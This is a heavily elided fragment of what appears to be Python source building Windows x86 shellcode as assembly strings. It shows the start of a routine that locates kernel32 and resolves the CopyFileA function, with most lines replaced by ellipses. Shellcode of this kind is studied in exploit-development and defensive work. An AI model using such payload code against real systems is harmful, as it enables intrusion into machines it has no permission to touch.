# # This WIN32 API Function CopyFileA used for copying files.
...
CODE = (
    ...
    # --- Original code (kernel32 base and function resolution) ---
    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  # ECX = 0
    ...
    "   mov   [ebp+0x10], eax           ;"  # Save CopyFileA address
